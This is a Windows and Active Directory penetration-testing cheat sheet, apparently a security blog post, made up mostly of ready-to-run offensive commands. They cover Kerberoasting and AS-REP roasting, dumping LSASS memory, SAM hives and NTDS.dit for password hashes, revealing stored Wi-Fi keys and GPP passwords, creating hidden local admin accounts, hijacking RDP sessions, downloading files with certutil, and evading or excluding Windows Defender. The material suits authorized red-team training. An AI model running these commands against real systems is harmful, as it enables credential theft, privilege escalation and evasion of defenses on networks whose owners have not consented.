---
title: "Windows"
description: "Tips to pentest Windows systems."
date: 31/07/2019
categories:
 - Windows
tags:
 - lsass
 - Kerberos
 - commands
mitre:
 - T1003/001
---


## Find accounts

### List SPN accounts

An account can be used to executes features (Service) on a server. Theses features
are calls SPNs and are represented as follow:

```
service-class/hostname-FQDN(:port)(/arbitrary-name)
```

More details are available on the [Microsoft documentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names)

The following LDAP query lists the accounts with a SPN on the domain:

```ldap
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
```

With Powershell, the script is the following:

```powershell
$users = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))")).FindAll()
```


### Kerberoast

The Kerberoast attack consist on asking a TGS for a specific SPN then brute-force
the hash to recover the account password.
With the list of SPN account, the attacker is going to target accounts with
privileges. The success of this attack depends on the company password policy.

[Rubeus](https://github.com/GhostPack/Rubeus) dumps the hash of a target SPN account:

```bash
Rubeus.exe kerberoast /creduser:"<fqdn_dom>\<user>" /credpassword:"<password>" /domain:"<fqdn_dom>" /outfile:"kerberoast.hash.txt"
```

You can also use the `impacket` script [`GetUserSPNs.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
to get the hash in a format that `John` or `Hashcat ` can brute-force:

```bash
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -format <john/empty> -outputfile hashes.txt
```


### KerberosUnConstrainedDelegation

More information [here](https://adsecurity.org/?p=1667)

```powershell
$ Import-Module ActiveDirectory
$ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description'

# UserAccountControl & 0x80000 (TRUSTED_FOR_DELEGATION)
# UserAccountControl & 0x100000 (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION)
$ $computers = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=Computer)(primaryGroupID=515)(useraccountcontrol:1.2.840.113556.1.4.804:=524288))")).FindAll().Properties
$ foreach($c in $computers) { echo "$($c.name) ($($c.useraccountcontrol))" }
```

The website [LdapWiki](https://ldapwiki.com/wiki/) explains how to write a LDAP query. For instance,
if we want to use bitwise in ldap queries, we need to use some special arguments.

There are two Bitwise operation Extensible Match Rules.
```
1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)
```

![](https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png)


### Kerberos preauthentication

A domain user can have the property "Do net required Kerberos preauthentication".
In this configuration, it's possible to ask to the KDC a TGT that is signed with
the user password. So the clear password can be retrieve with a brute-force attack.

The goal is to list the users that have this settings enable:

- [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1) : `Get-DomainUser -PreauthNotRequired`
- LDAP: `userAccountControl:1.2.840.113556.1.4.803:=4194304`

```powershell
$users = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))")).FindAll()
```

Then you can use the `impacket` script [`GetNPUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
to get the TGT in a format that `John` or `Hashcat ` can brute-force:

```bash
python GetNPUsers.py <domain>/ -usersfile users.txt -format <john/empty> -outputfile hashes.txt
```

From [@harmj0y](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py).


### AdminCount, AdminSDHolder & SDProp

The Security Descriptor propagator (`SDProp`) process runs every 60 minutes
and re-sets the ACL of the protected objects with the security permissions set
on the `AdminSDHolder` (check with ADExplorer).

The objects protected by `AdminSDHolder`have the attribute `AdminCount` set to 1:

```powershell
$persons = (New-Object System.DirectoryServices.DirectorySearcher("(&(admincount=1)(objectCategory=person))")).FindAll()
$groups = (New-Object System.DirectoryServices.DirectorySearcher("(&(admincount=1)(objectCategory=group))")).FindAll()
```

It's possible to change the `SDProp` interval from 60 to 7200 seconds (one minute to two hours).
You can also run the process manually.

Source: [https://adsecurity.org/?p=1906](https://adsecurity.org/?p=1906)


### Truster Account

The [PDF](https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf) from SSTIC 2014 describes trusts accounts on Windows:

```
sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
```


### User by Supported Encryption Types

The attribut `msDS-SupportedEncryptionTypes` containes the supported encryption
types for an object. It's possible the search for users that support `RC4`
encryption:

```powershell
$users = (New-Object System.DirectoryServices.DirectorySearcher("(&(ObjectClass=User)(ObjectCategory=Person)(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.804:=4))")).FindAll()
```

The data is a 32-bits unsigned in little-endian format that contains a bitwise
of the following flags: 

| Value | Description             |
|:-----:|:-----------------------:|
|     1 | DES-CBC-CRC             |
|     2 | DES-CBC-MD5             |
|     4 | RC4-HMAC                |
|     8 | AES128-CTS-HMAC-SHA1-96 |
|    16 | AES256-CTS-HMAC-SHA1-96 |

Source: [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6cfc7b50-11ed-4b4d-846d-6f08f0812919](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6cfc7b50-11ed-4b4d-846d-6f08f0812919)


### User enumeration

#### LDAP search

Here is two queries to fetch informations of a domain controller using LDAP:

```bash
ldapsearch -h <host> -x -s base namingcontexts
ldapsearch -h <host> -x -b "DC=xxx,DC=yyy" '(objectClass=Person)' sAMAccountName
```


#### RPCClient

If the NULL session is activated on the Windows domain, then you can list the users
with `rpcclient`:

```bash
rpcclient -U '' <host>
rpcclient $> enumdomusers
rpcclient $> queryuser <user>
```


## Find passwords

### Decrypt GPO with cpassword

Some `Group Policy Preferences` (GPP) GPO stored at `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`
contains an account credentials for administration on a remote host.
The credentials are encrypted using a [static AES key provided by Microsoft](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN).
A domain user can access the GPP XML files on read the encrypted password. To
get the clear text credentials the [Python script can be used](/assets/cpassword.py).

This [article on AdSecurity](https://adsecurity.org/?p=2288) presents other tools
and the protection ([KB2962486](https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati)).


### Dump LSASS process

There is various methods to dump the `lsass` process memory:

- TaskManager
- Rundll32 & comsvcs.dll
- [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
- [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)
- [SQLDumper](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/)
- Mimikatz
- [lsassy](https://github.com/Hackndo/lsassy)
- [Silent Process Exit mechanism](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
- [nanodump](https://github.com/helpsystems/nanodump)


To prevent an Administrator to dump `lsass` you can enable [LSA Protection (`RunAsPPL`)](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection).


#### Procdump

```bash
procdump -accepteula -ma lsass.exe lsass.dmp
```

If you rename procdump.exe to dump64.exe and place it in the
`C:\Program Files (x86)\Microsoft Visual Studio\*` folder, you can bypass 
Defender and dump LSASS.


#### Rundll32 & comsvcs.dll

You need to get the PID of `lsass` before dumping it.

```bash
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full
```


#### SQLDumper

You need to get the PID of `lsass` before dumping it. The tool can be found in
one of the following path:

```
C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe
C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe
```

```bash
sqldumper.exe <PID> 0 0x01100:40
```

### SAM and SYSTEM backup

You can dump the hives from a running Windows machine with the `reg` command:

```powershell
reg save HKLM\SYSTEM SystemBkup.hiv
reg save HKLM\SAM SamBkup.hiv
```

On the hard-drive, the files are stored in `C:\Windows\System32\config`. Even
`nt authority\system` cannot copy those files.

With `mimikatz` you can recover the hashes:

```powershell
lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
```


### Calculate NTLM hash

```python
import hashlib
pwd = "password"
print(hashlib.new('md4', pwd.encode('utf-16le')).hexdigest())
```


### List Wifi networks and password

```bash
$ netsh wlan show profile
$ netsh wlan show profile <WiFi name> key=clear
```

### Extract NTDS from a domain controller

On a DC, open a cmd shell:

```batch
ntdsutil
activate instance ntds
ifm
create full C:\ntds.dit
quit
quit
```

If you have a remote shell, you can also use the one-liner:

```batch
ntdsutil "ac i ntds" "ifm" "create full C:\ntds.dit" q q
```

On your machine, use `impacket` to recover the hashes:

```bash
python secretsdump.py -ntds <ntds.dit> -system <SYSTEM> LOCAL -outputfile <output> -pwd-last-set -user-status -history
```


## Miscs

### Use Win32 API in Python

Download then install the pip package `pywin32` here: [https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32)


### Get NTP configuration server
```bash
$ w32tm /query /status
```


### Windows 10 versions

[Release Informations](https://docs.microsoft.com/fr-fr/windows/release-information/)


### Compile .Net without Visual Studio

```bash
cd \Windows\Microsoft.NET\Framework\v4*
msbuild "path\to\SharpUp-master\SharpUp.sln" /t:Rebuild /p:Configuration=Release /p:Platform="Any CPU"
```

Or to compile a single file:
```bash
cd \Windows\Microsoft.NET\Framework\v4*
csc.exe /t:exe /out:path\to\main.exe path\to\main.cs
```

```csharp
using System;

public class HelloWorld {
    public static void Main() {
        Console.WriteLine("Hello world!");
    }
}
```

### Basic Service in C# #

```csharp
using System.Diagnostics;
using System.ServiceProcess;

namespace MyService {
    public class Service:ServiceBase {
        protected override void OnStart(string[] args) {
            Process.Start(@"C:\Windows\System32\cmd.exe", @"/C ""<cmd>""");
        }
    }

    static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() } ); }}
}
```


### Cmd Hijack

You can confuse the `cmd.exe` binary with a directory traversal:

```bash
cmd.exe /c "ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe"
```

Using this, you can hijack an argument such as a IP address in the ping call to
execute an other binary.
[Julian Horoszkiewicz explains the details on his blog](https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/)


### TCP dump with netsh

You can use `netsh trace` to dump TCP connexions on a Windows system. The following
command start a service that dump the packets:

```bash
$ netsh trace start scenario=NetConnection capture=yes report=yes persistent=no maxsize=1024 correlation=yes traceFile=C:\Temp\NetTrace.etl
```

To start to service, you need to type:
```bash
$ netsh trace stop
```

When the service is stopped, it create an `etl` file (and a `cab` for the report)
that contains the packets. To import it to Wireshark, you need to convert the file
to a `pcap` file. The tool `etl2pcapng` can be used to convert the file. It's
available on [Github](https://github.com/microsoft/etl2pcapng).

```bash
$ etl2pcapng.exe NetTrace.etl  NetTrace.pcapng
IF: medium=eth  ID=0    IfIndex=13
Converted 3948 frames
```


### Add user to local admin

```bash
# create a local user. End the username with a `$` to create a hidden local account
net user <username> <password> /add
# add user to local admin group, if the user is from a domain then use <domain>\<username>
net localgroup Administrators <username> /add
```


### Hijack Windows session

As a `SYSTEM` user, enumerate sessions with 

```powershell
query user
```

Then use the following command to hijack a user session: 

```powershell
cmd /k tscon 2 /dest:console
```


### Extract Microsoft Update files

A Windows Update is a `.msu` archive that contains a `.cab` archive. This file
contains the new binaries (`.dll`, `.exe`, ...). To extract the two archive you
can use the `expand` command:

```bash
expand -f:* "update.msu" "%temp%\\update.msu"
expand -f:* "%temp%\\update.msu\\update.cab" "%temp%\\update.msu\\update.cab"
```


### Download file with certutil

`certutil` is a useful tool to encode/decode and hash files. You can also
download files with the following command:

```bash
certutil -urlcache -split -f "{URL}"
```

In your current directory there will be downloaded file. Be aware that there is
cached files of the process in the two directories:

```
%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
```


## System information

### Get system information

The command `systeminfo` lists the information about the system: Hostname,
OS version, System type, Domain, Hotfixs, network cards, ...

Also, you can read the log files from `%WINDIR%\inf` to get basic info:

```batch
type %WINDIR%\inf\setupapi.setup.log

[Device Install Log]
     OS Version = 10.0.19041
     Service Pack = 0.0
     Suite = 0x0100
     ProductType = 1
     Architecture = amd64
...
```


## Windows Defender

### Check Defender exclusion path

The registry node `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`
contains the exclusions paths. You can add your own to prevent scanning:

```powershell
reg ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t "C:\Path\To\Exclude" /d 0
```
